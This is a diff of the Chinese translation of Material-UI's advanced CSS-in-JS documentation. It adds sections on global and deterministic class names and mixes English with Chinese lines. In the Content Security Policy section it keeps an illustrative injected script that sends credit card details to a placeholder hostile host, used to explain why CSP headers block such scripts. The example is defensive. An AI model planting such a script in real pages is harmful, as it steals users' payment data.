@@ -98,7 +98,7 @@ const useStyles = makeStyles({
 });
 ```
 
-{{“demo”：“pages / css-in-js / advanced / StringTemplates.js”，“react”：“next”}}
+{{"demo": "pages/css-in-js/advanced/StringTemplates.js"}}
 
 ## CSS 注入顺序
 
@@ -237,17 +237,31 @@ const className = `${productionPrefix}-${identifier}`;
 
 ## 全局CSS
 
-我们提供了一个选项，使用 [`dangerouslyUseGlobalCSS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) 选项使类名称为 **deterministic**。 打开后, 类名将如下所:
+### `JSS-插件全局`
+
+The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset, you can use it to define global class names.
+
+{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}
+
+### Hybrid
+
+You can also combine JSS generated class names with global ones.
+
+{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}
+
+### Deterministic class names
+
+We provide an option to make the class names **deterministic** with the [`dangerouslyUseGlobalCSS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) option. 打开后, 类名将如下所:
 
 - 开发： `.AppBar-root`
 - 产量： `.AppBar-root`
 
-⚠️ **使用时要谨慎 `dangerouslyUseGlobalCSS`。** 我们提供此选项作为原型设计的逃生舱口。 依赖于它的代码在生产中运行有以下含义:
+⚠️ **Be cautious when using `dangerouslyUseGlobalCSS`.** We provide this option as an escape hatch for prototyping. 依赖于它的代码在生产中运行有以下含义:
 
 - 全局CSS本质上是很弱的 人们使用严格的方法, 如 [BEM](http://getbem.com/introduction/) 来解决问题。
 - 很难跟踪`classes`API的更改。
 
-⚠️当使用 `dangerouslyUseGlobalCSS` 独立（没有Material-UI）时，您应该使用 `选项` 参数命名样式表：
+⚠️ When using `dangerouslyUseGlobalCSS` standalone (without Material-UI), you should name your style sheets using the `options` parameter:
 
 ```jsx
 // Hook
@@ -269,11 +283,11 @@ const Button = withStyles(styles, { name: 'button' })(ButtonBase);
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-
+    
 
 此漏洞允许攻击者执行任何操作。 但是，使用安全的CSP标头，浏览器将不会加载此脚本。
 
-您可以在 [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)上阅读有关CSP的更多信息。
+You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
 
 ### 如何实现CSP？
 
